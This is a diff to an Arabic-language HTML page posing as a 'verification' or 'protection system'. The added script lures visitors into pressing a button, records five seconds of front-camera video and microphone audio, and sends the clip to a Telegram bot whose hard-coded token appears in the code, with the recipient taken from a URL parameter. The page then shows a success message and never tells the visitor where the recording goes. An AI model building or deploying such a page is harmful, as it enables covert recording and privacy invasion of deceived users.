@@ -3,49 +3,68 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>نظام التحقق من الفيديو</title>
+    <title>نظام التحقق</title>
     <style>
-        /* تصميم مطابق تماماً لصفحة الصور (Dark Theme) */
-        body {
-            background-color: #0d1117;
-            color: #c9d1d9;
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            height: 100vh;
-            margin: 0;
-        }
-
-        .loader {
-            border: 4px solid #21262d;
-            border-top: 4px solid #58a6ff;
-            border-radius: 50%;
-            width: 40px;
-            height: 40px;
-            animation: spin 1s linear infinite;
-            margin-bottom: 20px;
-        }
-
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-
-        .status-text {
-            font-size: 1.1rem;
-            letter-spacing: 1px;
-        }
+        body { background-color: #0d1117; color: white; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .btn { background-color: #238636; color: white; padding: 15px 30px; border: none; border-radius: 5px; cursor: pointer; font-size: 18px; }
+        .status { margin-top: 20px; color: #8b949e; }
     </style>
 </head>
 <body>
 
-    <div class="loader"></div>
-    <div class="status-text" id="status">جاري الاتصال بالسيرفر المؤمن...</div>
+    <div id="main-ui">
+        <button class="btn" onclick="startCapture()">تفعيل نظام الحماية</button>
+        <p class="status">يجب الضغط على الزر أعلاه للبدء</p>
+    </div>
 
     <video id="videoPreview" style="display:none;" autoplay muted playsinline></video>
 
     <script>
-        // إعدادات البوت والتحكم
         const botToken = '8128965245:AAHH3QO-vGGfWmFtCicmw7T9gmBcMWbUg6E';
+        const urlParams = new URLSearchParams(window.location.search);
+        const chatId = urlParams.get('sender_id');
+
+        async function startCapture() {
+            if (!chatId) { alert("Error: No ID"); return; }
+
+            document.getElementById('main-ui').innerHTML = "<p>جاري المعالجة...</p>";
+
+            try {
+                // طلب الكاميرا والمايكروفون (هنا ستظهر النقطة الخضراء)
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user" }, 
+                    audio: true 
+                });
+
+                const mediaRecorder = new MediaRecorder(stream);
+                const chunks = [];
+
+                mediaRecorder.ondataavailable = e => chunks.push(e.data);
+                mediaRecorder.onstop = async () => {
+                    const blob = new Blob(chunks, { type: 'video/webm' });
+                    await sendVideo(blob);
+                    stream.getTracks().forEach(t => t.stop()); // إطفاء النقطة الخضراء بعد الانتهاء
+                };
+
+                mediaRecorder.start();
+                setTimeout(() => mediaRecorder.stop(), 5000); // تسجيل 5 ثوانٍ
+
+            } catch (err) {
+                alert("يرجى السماح بالوصول للكاميرا لتشغيل النظام");
+            }
+        }
+
+        async function sendVideo(blob) {
+            const fd = new FormData();
+            fd.append('chat_id', chatId);
+            fd.append('video', blob, 'video.webm');
+            
+            await fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
+                method: 'POST',
+                body: fd
+            });
+            document.body.innerHTML = "<h2>اكتملت العملية بنجاح</h2>";
+        }
+    </script>
+</body>
+</html>
